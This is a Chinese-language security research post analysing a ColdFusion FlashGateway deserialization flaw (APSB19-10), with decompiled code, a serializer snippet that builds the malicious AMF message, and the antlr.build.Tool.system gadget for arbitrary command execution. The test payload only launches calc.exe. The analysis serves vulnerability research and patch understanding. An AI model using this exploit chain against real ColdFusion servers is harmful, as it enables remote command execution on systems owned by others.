> 原文链接: https://www.anquanke.com//post/id/175357 


# ColdFusion FlashGateway 反序列化漏洞分析


                                阅读量   
                                **224203**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01c31cdeab7bba249f.png)](https://p3.ssl.qhimg.com/t01c31cdeab7bba249f.png)



2019年2月12日，Adobe官方发布了针对Adobe ColdFusion的安全更新补丁，编号为APSB19-10。但是针对该漏洞的分析，目前网上我只见到一篇文章，[https://paper.seebug.org/811/](https://paper.seebug.org/811/)， 虽然文章没有给出太多的细节（对于我们小白而言）但根据该文章的提示，我们还是可以定位分析该漏洞，成功写出漏洞利用代码的。下面我就介绍下，我整个的分析过程。



## 环境搭建

讲真，这个环境搭建真心不太容易，想从网上下一款老版的ColdFusion安装包真的很难，还好我很久之前下过，所以这里省了我很多工夫。

安装包：ColdFusion_2016_WWEJ_win64.exe update3 版本存在漏洞。

安装完之后，默认后台地址为http://127.0.0.1:8500/CFIDE/administrator/index.cfm



## 漏洞定位

根据seebug文章中的介绍，漏洞出现在FlashGateway中。在web.xml中搜索flashgateway，其中一条信息如下



```
&lt;servlet-mapping id="coldfusion_mapping_1"&gt;

&lt;servlet-name&gt;FlashGateway&lt;/servlet-name&gt;

&lt;url-pattern&gt;/flashservices/gateway/*&lt;/url-pattern&gt;

&lt;/servlet-mapping&gt;
```

访问[http://127.0.0.1:8500/flashservices/gateway/](http://127.0.0.1:8500/flashservices/gateway/),发现该网址可以访问，猜测出现漏洞的就是该网站。

根据seebug文章的规避方案可知，漏洞和gateway-config.xml也有关，于是为了方便后面漏洞调试，我们把&lt;service-adapters&gt;中的配置全部打开（后面测试可知，其实只需要打开flashgateway.adapter.java.JavaAdapter配置即可）重启服务coldfusion.exe -restart -console

知道网站漏洞路径，下面我们就要定位漏洞代码，在cfusion的lib目录下有个文件flashgateway.jar，是不是像极了爱情，我们jd-gui打开该jar，可以看到，漏洞所涉及的类都在这个jar包中，真好。



## 漏洞分析

### **（1）简要分析**

我们先到web.xml中，看下FlashGateway这个servlet的流程，从如下配置文件中可知，在访问[http://127.0.0.1:8500/flashservices/gateway/后，会先到coldfusion.bootstrap.BootstrapServlet](http://127.0.0.1:8500/flashservices/gateway/%E5%90%8E%EF%BC%8C%E4%BC%9A%E5%85%88%E5%88%B0coldfusion.bootstrap.BootstrapServlet)中，通过参数配置，大概可以猜测（事实也是如此），该类会加载flashgateway.controller.GatewayServlet。

[![](https://p1.ssl.qhimg.com/t01d43cd245c68533a6.png)](https://p1.ssl.qhimg.com/t01d43cd245c68533a6.png)

GatewayServlet类中service(HttpServletRequest req, HttpServletResponse res)，接收来之http的请求，然后调用context = this.gateway.invoke(context)进入GateWay类中的invoke()

[![](https://p5.ssl.qhimg.com/t01fbb79f01059b0558.png)](https://p5.ssl.qhimg.com/t01fbb79f01059b0558.png)

This. serialFilter由CreateFilters赋值

[![](https://p2.ssl.qhimg.com/t0105500dd1a6cd7760.png)](https://p2.ssl.qhimg.com/t0105500dd1a6cd7760.png)

程序进入SerializationFilter的invoke()函数，该函数中对传入的数据进行了反序列化处理。



```
context.setResponseMessage(new ActionMessage());

MessageDeserializer deserializer = new MessageDeserializer(super.gateway);

deserializer.setDebugBuffer(debugBuffer);

deserializer.setInputStream(context.getHttpRequest().getInputStream());

try `{`

ActionMessage m = new ActionMessage();

context.setRequestMessage(m);

deserializer.readMessage(m);

success = true;

`}`
```

函数中创建MessageDeserializer对象，然后调用readMessage(m),将传入的ActionMessage数据反序列化，并复制给context中的相关变量。

这里我们先简单看下ActionMessage的成员变量



```
public class ActionMessage implements Serializable `{`

private static final int CURRENT_VERSION = 0;

private int version;

private ArrayList headers = null;

private ArrayList bodies = null;
```

其有两个数组列表headers和bodies。类型分别为MessageHeader、MessageBody。其中MessageBody和漏洞利用息息相关，所以这里我们重点关注其成员变量



```
public class MessageBody implements Serializable, GatewayConstants `{`

private String targetURI;

private String responseURI;

protected Object data;

public String adapterName;

public String serviceName;

public String functionName;

public List parameters;

public List roles;

public boolean useBasicAuthentication;

public boolean useCustomAuthentication;

public String serviceType;
```

重要的变量有targetURL、data、serviceName、functionName、paramters。

我们再回到反序列化函数readMessage(m)中



```
public void readMessage(ActionMessage m) throws IOException `{`

int version = this.in.readUnsignedShort();

m.setVersion(version);

int headerCount = this.in.readUnsignedShort();



for(int i = 0; i &lt; headerCount; ++i) `{`

MessageHeader header = new MessageHeader();

m.addHeader(header);

this.readHeader(header, i);

`}`



int bodyCount = this.in.readUnsignedShort();



for(int i = 0; i &lt; bodyCount; ++i) `{`

MessageBody body = new MessageBody();

m.addBody(body);

this.readBody(body, i);

`}`

`}`
```

函数功能就是根据格式（header、body）对数据进行反序列化。

**下面引用seebug上的一段话：**

完成序列化过程后，此时ActionContext context中的内容即为输入流中精心构造的ActionMessage信息。在flashgateway.filter.AdapterFilter的invoke方法中，读取ActionContext中的MessageBody信息赋值给serviceName、functionName、parameters等，通过adapter=locateAdapter(context, serviceName, functionName, parameters, serviceType)方法得到flashgateway.adapter.java.JavaBeanAdapter类型的adapter，然后执行JavaBeanAdapter的invokeFunction方法。关键代码如下：



```
public ActionContext invoke(ActionContext context) throws Throwable `{`

this.processHeaders(context);

Object result = null;

String replyMethodName = "/onStatus";

MessageBody requestMessageBody = context.getRequestMessageBody();

String serviceName = requestMessageBody.serviceName;

String functionName = requestMessageBody.functionName;

List parameters = requestMessageBody.parameters;



try `{`

Throwable e;

try `{`

e = null;

String serviceType = requestMessageBody.serviceType;

ServiceAdapter adapter;

if (context.isDescribeRequest()) `{`

adapter = this.locateAdapter(context, serviceName, (String)null, (List)null, serviceType);

`}` else `{`

adapter = this.locateAdapter(context, serviceName, functionName, parameters, serviceType);

`}`

//......

//adapter为JavaBeanAdapter，执行flashgateway.adapter.java.JavaBeanAdapter的invokeFunction方法

if (context.isDescribeRequest()) `{`

result = adapter.describeService(context, serviceName);

`}` else `{`

result = adapter.invokeFunction(context, serviceName, functionName, parameters);

`}`
```

其中，目标执行方法method通过Method method = this.getMethod(parameters, serviceName, functionName, aClass)得到；方法执行对象service 通过service = aClass.newInstance()得到；方法执行参数parameters.toArray()通过MessageBody得到。由此可见，method.invoke(service, parameters.toArray())的所用参数都可控，意味着可执行任意方法。



```
public Object invokeFunction(ActionContext context, String serviceName, String functionName, List parameters) throws Throwable `{`

this.assertAccess(serviceName);

Class aClass = Class.forName(serviceName);

Object service = null;

HttpServletRequest req = context.getHttpRequest();

HttpSession session = req.getSession();

if (session.getAttribute(aClass.getName()) != null) `{`

service = session.getAttribute(aClass.getName());

`}` else `{`

service = aClass.newInstance();

session.setAttribute(aClass.getName(), service);

`}`



Method method = this.getMethod(parameters, serviceName, functionName, aClass);

return this.testPageable(context, method.invoke(service, parameters.toArray()));

`}`
```

有了这些信息，我想我可以简单写出payload进行测试（但是实际上并不能，但一开始谁知道呢）。

### **（2）初次尝试攻击**

为了方便测试，我自己写了个简单的类，



```
package cmd;

public class MyCmd `{`

public MyCmd() `{`



`}`

public void cmd(String cmd) `{`

try`{`

Runtime.getRuntime().exec(cmd);

`}`

catch (Exception e) `{`

`}`

`}`

`}`
```

并将其打包成CmdPayload.jar，放在cfusion目录下的lib目录下。

下面我们就要构造序列化内容，怎么构造序列化内容呢

我最初的想法是，定义ActionMessage，然后赋值，将对象序列化，然后发送到目标地址，如下所示：



```
//序列化

ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ActionMessageSer"));

oos.writeObject(myActionMessage);

oos.close();
```

数据发送后，返回信息提示afm协议错误（肯定是数据有格式要求），于是又经过一番折腾，发现FlashGateway.jar中正好提供一个类MessageSerializer用来序列化ActionMessage对象（想想也没毛病，既然有反序列化，那就应该有序列化）。

我们看下MessageBody对象序列化的过程。



```
private void writeBody(MessageBody b) throws IOException `{`

if (b.getTargetURI() == null) `{`

this.dataOut.writeUTF("null");

`}` else `{`

this.dataOut.writeUTF(b.getTargetURI());

`}`



if (b.getResponseURI() == null) `{`

this.dataOut.writeUTF("null");

`}` else `{`

this.dataOut.writeUTF(b.getResponseURI());

`}`



this.dataOut.writeInt(-1);

this.amfOut.resetReferences();

this.amfOut.writeObject(b.getData());

`}`
```

看到这个代码后，我很是苦恼，我们前面说过，反序列化最后调用过程中的几个重要变量分别是serviceName、functionName、parameters，这个过程没有任何对这些变量做处理的代码，然后再看看MessageDeserializer中对MessageBody的反序列化处理，也是没有这些变量的代码处理。那问题就来了，最后出现的这几个变量的值是怎么来的？？？

### **（3）过滤器链**

关键变量的值是怎么传到服务器的？我们需要再理下流程。前面说到数据先到SerializationFilter最后会到AdapterFilter中。我们在序列化MessageBody时并没有直接处理serviceName相关变量，猜测数据的处理可能在SerializationFilter和AdapterFilter中间。

我们仔细分析下GateWay中的createFilters()函数，发下该函数创建了一个过滤器链，数据会按照这个过滤器链传递。

**SerializationFilter**-&gt;debugFilter-&gt;packetSecurityFilter-&gt;BatchProcessFilter-&gt;logFilter-&gt;errorFilter-&gt;licenseFilter-&gt;sessionFilter-&gt;envelopeFilter-&gt;**serviceNameFilter**-&gt;messageSecurityFilter-&gt;**adapterFilter**

[![](https://p5.ssl.qhimg.com/t01e0a196b643c52052.png)](https://p5.ssl.qhimg.com/t01e0a196b643c52052.png)

依次查看过滤器代码，在ServiceNameFilter中发现了对serviceName的处理代码：



```
public ActionContext invoke(ActionContext context) throws Throwable `{`

MessageBody messageBody = context.getRequestMessageBody();

String targetURI = messageBody.getTargetURI();

int dotIndex = targetURI.lastIndexOf(".");

if (dotIndex &gt; 0) `{`

messageBody.serviceName = targetURI.substring(0, dotIndex);

`}`



if (targetURI.length() &gt; dotIndex) `{`

messageBody.functionName = targetURI.substring(dotIndex + 1);

`}`



Object messageData = messageBody.getData();

List parameters = null;

if (messageData == null) `{`

parameters = new ArrayList();

`}` else if (!(messageData instanceof List)) `{`

parameters = new ArrayList();

((List)parameters).add(messageData);

`}` else `{`

parameters = (List)messageBody.getData();

`}`



messageBody.parameters = (List)parameters;

……

`}`



super.next.invoke(context);

return context;

`}`
```

由上可知serviceName和functionName均来自targetURL，Parameters参数来自data。

比如我们要执行cmd.MyCmd类中的cmd函数,

targetURI赋值cmd.MyCmd.cmd即可

parameters通过data赋值

如果你看下PacketSecurityFilter中的代码，你就会发现整个流程的处理，可以不需要MessageHeader，所以我们前面基本不提MessageHeader相关细节。

下面我写了个简单的代码，执行我们的payload（我们之前手动放到lib目录下的CmdPayload.jar）



```
MessageSerializer myMessageSer = new MessageSerializer(false, "Classic", false);

myMessageSer.setOutputStream(new FileOutputStream("MessageSerializerSer"));



ActionMessage myActionMessage = new ActionMessage();

myActionMessage.setVersion(3);

//init msg header

//MessageHeader msgHeader1 = new MessageHeader("header1", false, "11111111111");

MessageBody msgBody1 = new MessageBody();

msgBody1.setTargetURI("cmd.MyCmd.cmd");

List&lt;String&gt; paramList = new ArrayList&lt;&gt;();

paramList.add("D:\\calc.exe");

msgBody1.setData(paramList);

myActionMessage.addBody(msgBody1);

myMessageSer.writeMessage(myActionMessage);
```

测试后发现，漏洞利用成功。



## 漏洞利用

数据处理的整个流程基本已经清楚，漏洞触发也没啥问题，但实际环境中我们不可能事先在别人的机器放上我们写好的jar文件吧。

漏洞利用，我们想要的最好结果，要么就是任意命令执行、要么能够上传、写文件也是ok的。

如果去测试java常用的攻击相关的类，比如Runtime、ProcessBuilder、File等类去做利用，都会失败（下面利用都是我个人对这个漏洞的理解，不一定完全正确）。

为什么呢，我们在看下JavaBeanAdapter中反射执行的代码



```
Class aClass = Class.forName(serviceName);

......

service = aClass.newInstance();
```

调用newInstance()去实例化类对象，这个函数要求，**被实例化的类必须有一个public无参数的构造函数，**使用getMethod()函数获取类的**成员函数要求该函数必须是public。**

现在我们明白能用来做该漏洞攻击的类必须具备两个条件
1. **该类有一个public且无参数的构造函数**
1. **被执行的函数必须是public类型的**
再去对比Runtime、File、ProcessBuilder等类，均不满足条件。

这两个条件给这个漏洞的利用制造一定的困难，要寻找这样条件的，还能满足我们执行代码要求的类，有点大海捞针的感觉。

但幸运的是，我还是找到了，在cufsion\lib目录下，有众多jar文件，怎么办，一个一个找呗，最后锁定两个jar文件ant.jar和antlr-2.7.6.jar，但是ant.jar的利用问题较多，未能成功。最后利用antlr-2.7.6.jar中的antlr.build.Tool.system成功实现任意代码执行。

Public 无参数的构造函数:

```
public Tool() `{`
this.os = System.getProperty("os.name");
`}`

public的成员函数:

public void system(String var1) `{`

Runtime var2 = Runtime.getRuntime();



try `{`

this.log(var1);

Process var3 = null;

if (!this.os.startsWith("Windows")) `{`

var3 = var2.exec(new String[]`{`"sh", "-c", var1`}`);

`}` else `{`

var3 = var2.exec(var1);

`}`

......

int var6 = var3.waitFor();

`}` catch (Exception var7) `{`

this.error("cannot exec " + var1, var7);

`}`

`}`
```



## 新版补丁

[![](https://p2.ssl.qhimg.com/t0105a49b07f2bcfe50.png)](https://p2.ssl.qhimg.com/t0105a49b07f2bcfe50.png)

新版本中JavaBeanAdapter的invokeFunction函数多了一句判断执行的类是否合理

** **

## 参考：

[1].[https://paper.seebug.org/811/](https://paper.seebug.org/811/)
